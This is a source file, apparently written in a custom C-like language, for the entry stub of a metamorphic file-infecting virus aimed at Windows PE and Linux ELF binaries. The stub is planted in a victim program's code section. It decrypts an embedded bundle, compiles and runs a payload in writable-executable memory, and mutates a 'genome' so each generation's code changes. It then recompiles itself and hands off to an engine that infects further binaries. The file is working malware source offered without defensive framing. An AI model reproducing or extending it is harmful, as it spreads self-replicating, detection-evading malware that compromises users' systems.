// integrator_entry.mc — Bundle entry for infected PE/ELF binaries.
//
// Scattered into the victim's .text. At runtime it:
//   1. Decrypts the bundle data
//   2. Compiles + runs payload (RWX)
//   3. Mutates the genome
//   4. Compiles entry.mcb (scatter/abs PIC + transformed mcb)
//   5. Compiles engine.mcb (PIC for RWX + transformed mcb)
//   6. Populates InfectBundle, loads engine into RWX, calls it
//
// All compile_one calls live HERE — engines consume pre-compiled bytes via
// the InfectBundle pointer patched into their data section.
//
// Bundle layout in .data: [entry.mcb | engine.mcb | payload.mcb | genome]

#include "../../compiler/backend/backend_mystc.mc"
#include "integrator_common.mc"

// `load_and_run_bin` (and the Win32 / Linux extern-resolver plumbing it
// needs) lives in `stdlib.mc`, included transitively via backend_mystc.mc.

int main() {
    char* entry_mcb; int entry_sz;
    char* eng_mcb;   int eng_sz;
    char* pay_mcb;   int pay_sz;
    char* genome;    int gen_sz;
    struct BundleHeader* h;
    struct CompileOutput co_payload;
    struct CompileOutput co_entry;
    struct CompileOutput co_engine;
    struct CompileOutput co_pay_remit;
    struct InfectBundle bundle;
    int flags;
    int entry_flags;
    int pay_remit_flags;

    init_io();

    // bundle_open validates magic + version and decrypts the payload region
    // in place via header.key (zeroed on success). Components are then read
    // via bundle_get(h, BC_*, &sz).
    h = g_bundle_header;
    if (bundle_open(h) == 0) { return 0; }
    entry_mcb = bundle_get(h, BC_ENTRY,   &entry_sz);
    eng_mcb   = bundle_get(h, BC_ENGINE,  &eng_sz);
    pay_mcb   = bundle_get(h, BC_PAYLOAD, &pay_sz);
    genome    = bundle_get(h, BC_GENOME,  &gen_sz);

    // Payload: compile + RWX run with PRE-mutation genome
    if (pay_sz > 0) {
        flags = build_flags_from_genome(genome, gen_sz);
#ifdef LINUX
        flags = flags | CF_CDECL_EXTERNS;
#endif
        co_payload.bin_data = 0; co_payload.bin_size = 0;
        co_payload.mc_data = 0;  co_payload.mc_size = 0;
        compile_one(pay_mcb, pay_sz, genome, gen_sz,
                    flags & ~CF_ABS_PE & ~CF_SCATTER_ELF & ~CF_EMIT_MC, &co_payload);
        if (co_payload.bin_size > 0) {
            load_and_run_bin(co_payload.bin_data, co_payload.bin_size, 0, 0);
        }
    }

    // Mutate genome (post-payload, pre-entry/engine compile)
    if (gen_sz > 0) {
        mut_seed(runtime_seed());
        mutate_genome(genome, gen_sz);
    }

    // Re-emit payload mcb under the mutated genome so its source drifts in
    // lockstep with entry/engine across generations. Must run BEFORE the
    // entry compile — compile_main sets g_bundle_header_off as a side effect
    // and the value captured at bundle.entry_bundle_header_off below must be
    // the entry's, not the payload's.
    co_pay_remit.bin_data = 0; co_pay_remit.bin_size = 0;
    co_pay_remit.mc_data = 0;  co_pay_remit.mc_size = 0;
    if (pay_sz > 0) {
        pay_remit_flags = build_flags_from_genome(genome, gen_sz) | CF_EMIT_MC;
#ifdef LINUX
        pay_remit_flags = pay_remit_flags | CF_CDECL_EXTERNS;
#endif
        compile_one(pay_mcb, pay_sz, genome, gen_sz,
                    pay_remit_flags & ~CF_ABS_PE & ~CF_SCATTER_ELF, &co_pay_remit);
    }

    // Compile entry.mcb: scatter/abs PIC + transformed mcb
    flags = build_flags_from_genome(genome, gen_sz) | CF_EMIT_MC;
#ifdef WIN32
    entry_flags = flags | CF_ABS_PE;
#endif
#ifdef LINUX
    entry_flags = flags | CF_SCATTER_ELF | CF_CDECL_EXTERNS;
#endif
    co_entry.bin_data = 0; co_entry.bin_size = 0;
    co_entry.mc_data = 0;  co_entry.mc_size = 0;
    compile_one(entry_mcb, entry_sz, genome, gen_sz, entry_flags, &co_entry);
    if (co_entry.bin_size == 0) { return 0; }

    // Snapshot entry's BundleHeader offset — engine patches this slot in the
    // new infected binary's entry-program data section so its main() can
    // locate the header at runtime.
    bundle.entry_bundle_header_off   = g_bundle_header_off;

    // Compile engine.mcb: PIC + transformed mcb
#ifdef LINUX
    flags = flags | CF_CDECL_EXTERNS;
#endif
    co_engine.bin_data = 0; co_engine.bin_size = 0;
    co_engine.mc_data = 0;  co_engine.mc_size = 0;
    compile_one(eng_mcb, eng_sz, genome, gen_sz, flags, &co_engine);
    if (co_engine.bin_size == 0) { return 0; }

    // Populate bundle. The engine reads original components through
    // entry_header (bundle_get); only runtime products of entry's compiles
    // need their own fields.
    bundle.victim_path         = 0;
    bundle.prng_seed           = runtime_seed();
    bundle.entry_header        = h;
    bundle.entry_pic_data      = co_entry.bin_data;
    bundle.entry_pic_size      = co_entry.bin_size;
    bundle.new_entry_mcb_data   = co_entry.mc_data;
    bundle.new_entry_mcb_size   = co_entry.mc_size;
    bundle.new_engine_mcb_data  = co_engine.mc_data;
    bundle.new_engine_mcb_size  = co_engine.mc_size;
    bundle.new_payload_mcb_data = co_pay_remit.mc_data;
    bundle.new_payload_mcb_size = co_pay_remit.mc_size;

    // Run engine in RWX with InfectBundle pointer + entry's BundleHeader pointer.
    load_and_run_bin(co_engine.bin_data, co_engine.bin_size, &bundle, h);

    return 0;
}
